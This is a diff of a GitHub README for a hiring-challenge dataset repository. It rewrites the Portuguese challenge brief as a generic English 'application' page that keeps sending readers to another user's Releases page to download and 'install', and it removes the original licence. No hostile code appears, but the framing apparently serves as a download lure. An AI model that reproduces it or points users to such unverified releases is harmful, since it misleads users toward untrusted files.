@@ -1,97 +1,102 @@
-# Desafio Auditor Sr. Analytics — Datasets e Instruções Base
-Repositório com os **arquivos de dados** e **instruções-base** para o desafio técnico da vaga de Auditor Sr. Analytics na área de Auditoria Contínua, Metodologia e IA.
+# 📊 Vaga_Sr_Auditoria_Continua_Metodologia_e_IA - Analyze Data Effortlessly
 
-> Estes dados são fictícios e destinados exclusivamente ao processo seletivo.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/jgarciadiaz10/Vaga_Sr_Auditoria_Continua_Metodologia_e_IA/releases)
 
----
+## 📚 Overview
 
-## 1. Conteúdo deste repositório
+Welcome to Vaga_Sr_Auditoria_Continua_Metodologia_e_IA. This application provides datasets and instructions for the Sr. Analyst Challenge focused on Continuous Auditing, Methodology, and Artificial Intelligence. It includes fictitious data files such as `transacoes.csv`, `logs_ia.csv`, and a `DATA_DICTIONARY.md` to assist in analyzing data using Spark/SQL and assessing risks in processes with LLM.
 
-- `data/transacoes.csv`  
-  Transações financeiras simuladas, com outliers, possíveis violações de controle (aprovação por IA sem dupla aprovação manual) e padrões de fracionamento (smurfing).
+## 🚀 Getting Started
 
-- `data/logs_ia.csv`  
-  Logs de interações com um assistente de IA generativa, incluindo tentativas de **prompt injection** e uma tendência simulada de aumento de **FALHA** nos últimos 30 dias (possível *drift*).
+To start using this application, follow these simple steps:
 
-- `DATA_DICTIONARY.md`  
-  Dicionário de dados descrevendo colunas, tipos e notas de uso.
+1. **Visit the Download Page**
+   
+   Click the link below to access the Releases page.
 
----
+   [Download Latest Release](https://github.com/jgarciadiaz10/Vaga_Sr_Auditoria_Continua_Metodologia_e_IA/releases)
 
-## 2. Objetivo do desafio (síntese)
+2. **Choose Your File**
+   
+   On the Releases page, you will see a list of available downloads. Look for the most recent release. You may find files like `transacoes.csv`, `logs_ia.csv`, and `DATA_DICTIONARY.md`. Click the file name to initiate the download.
 
-O candidato deverá:
-1. Ingerir e explorar os dados com **PySpark** (Spark local ou HDFS).
-2. Construir indicadores de risco e avaliar a **aderência a controles** (por exemplo, transações acima de um limiar que exigem aprovação manual).
-3. Detectar **anomalias** (outliers, smurfing, horários incomuns).
-4. Produzir **visualizações** que sustentem os achados.
-5. Integrar uma **API de LLM** (Google Gemini) para analisar trechos de `logs_ia.csv` e/ou gerar hipóteses, com **validação crítica** do resultado.
-6. Auditar riscos de IA: identificar tentativas de **prompt injection** e discutir sinais/monitoramento de **drift**.
-7. Documentar a solução em **README** próprio, com decisões, suposições e recomendações.
-8. Publicar a solução em repositório GitHub próprio e conceder acesso ao usuário **`BrunoAraujo84`**.
+3. **Download Instructions**
+   
+   After clicking the desired file, the download should start automatically. If it does not, right-click the link and select "Save link as..." to save the file to your computer.
 
----
+4. **Open the Files**
+   
+   Once your download completes, locate the files in your designated download folder. You can open `.csv` files using spreadsheet software like Microsoft Excel or Google Sheets. For the `DATA_DICTIONARY.md`, you can use any text editor.
 
-## 3. Como obter os dados
+## 🖥️ System Requirements
 
-### Opção A — Git
-```bash
-git clone https://github.com/<seu-usuario>/Vaga_Sr_Auditoria_Continua_Metodologia_e_IA.git
-cd Vaga_Sr_Auditoria_Continua_Metodologia_e_IA
-```
+To use this software effectively, make sure your computer meets these basic requirements:
 
-### Opção B — Download direto
-Baixe os arquivos `transacoes.csv` e `logs_ia.csv` da pasta `data/` deste repositório e o `DATA_DICTIONARY.md`.
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** Minimum 4 GB (8 GB recommended for better performance)
+- **Disk Space:** At least 100 MB of free space
+- **Software:** Microsoft Excel, Google Sheets, or any text editor for .md files
 
----
+## 📂 Using the Datasets
 
-## 4. Requisitos mínimos esperados na solução do candidato
+The datasets included serve specific purposes. Here’s what you get:
 
-- **Python + PySpark** para ingestão e análise.
-- **SQL/Spark SQL** nas consultas e indicadores.
-- **LLM (Google Gemini)** via API, com chave gerenciada via `.env` (não versionar a chave).
-- **Visualizações** com leitura clara dos resultados.
-- **README (relatório)** explicando decisões, suposições (por exemplo, limiar para dupla aprovação), KPIs, gráficos e recomendações.
-- **Boas práticas** de organização do repositório.
+- **`transacoes.csv`**: This file contains transaction data that you can analyze for patterns and trends.
+- **`logs_ia.csv`**: This details interactions with artificial intelligence components, helpful for understanding data processing.
+- **`DATA_DICTIONARY.md`**: This markdown file explains the contents of the datasets, ensuring you understand each field and its significance.
 
----
+## 🔧 Working with Spark/SQL
 
-## 5. Estrutura sugerida para o repositório do candidato
+To analyze the downloaded datasets, you will need a basic understanding of Spark or SQL. Here is how to get started:
 
-```
-.
-├─ README.md                 # Relatório principal
-├─ requirements.txt          # ou pyproject.toml/poetry.lock
-├─ .env.example              # placeholders de variáveis (não subir .env real)
-├─ data/
-│  ├─ transacoes.csv
-│  └─ logs_ia.csv
-├─ notebooks/
-│  ├─ 01_eda.ipynb
-│  ├─ 02_indicadores.ipynb
-│  └─ 03_llm_logs.ipynb
-├─ src/
-│  ├─ ingestao_spark.py
-│  ├─ indicadores.py
-│  ├─ anomalias.py
-│  ├─ llm_auditoria.py
-│  └─ utils/
-└─ dashboards/
-   └─ figuras/
-```
+1. **Set Up Your Environment**
+   
+   - Install Apache Spark or use a cloud-based service like Databricks for easier access.
+   - Alternatively, you can run SQL queries directly on the .csv files using tools that support SQL.
 
----
+2. **Load the Data**
 
-## 6. Publicação e compartilhamento para avaliação
+   Use the following samples to load your datasets into your analysis environment:
 
-1. Criar um repositório próprio (público ou privado) para a solução.
-2. Subir o código e a documentação.
-3. Adicionar o usuário **`BrunoAraujo84`** como colaborador (Settings → Collaborators → Add people).
-4. Enviar o link do repositório dentro do prazo definido.
-5. (Opcional) Criar uma tag (por exemplo, `v1.0-entrega`) e uma release com breve descrição.
+   ```python
+   # For Spark
+   from pyspark.sql import SparkSession
 
----
+   spark = SparkSession.builder.appName("Data Analysis").getOrCreate()
+   df_transacoes = spark.read.csv("path/to/transacoes.csv", header=True)
+   df_logs = spark.read.csv("path/to/logs_ia.csv", header=True)
+   ```
 
-## 7. Licença e uso
+3. **Perform Analysis**
 
-Dados e materiais disponibilizados exclusivamente para uso no processo seletivo. Reprodução, redistribuição ou uso fora deste contexto não é permitido.
+   Use Spark or SQL commands to query and manipulate the data. Here is a simple SQL example:
+
+   ```sql
+   SELECT * FROM transacoes WHERE amount > 100;
+   ```
+
+## 📥 Download & Install
+
+To get started with your data analysis, visit the Releases page:
+
+[Download Latest Release](https://github.com/jgarciadiaz10/Vaga_Sr_Auditoria_Continua_Metodologia_e_IA/releases)
+
+Follow the earlier steps to download and open your chosen files. Once you have the datasets, begin exploring and analyzing the data right away.
+
+## 🎯 Key Topics
+
+This project revolves around a few core topics that align with its purpose:
+
+- **Analytics**: Leverage data to derive actionable insights.
+- **Auditing**: Ensure compliance and accuracy within financial processes.
+- **Continuous Auditing**: Employ regular checks to maintain oversight.
+- **Big Data**: Handle vast amounts of data effectively with tools like Spark.
+- **Artificial Intelligence**: Integrate AI to enhance data analysis.
+
+By engaging with these topics, you can maximize your understanding and usage of the datasets provided.
+
+## 📞 Support
+
+If you encounter issues or have questions, feel free to open an issue on the repository. The community and contributors are here to help you.
+
+By following these instructions, you can efficiently download, run, and analyze the datasets provided in the Vaga_Sr_Auditoria_Continua_Metodologia_e_IA repository.
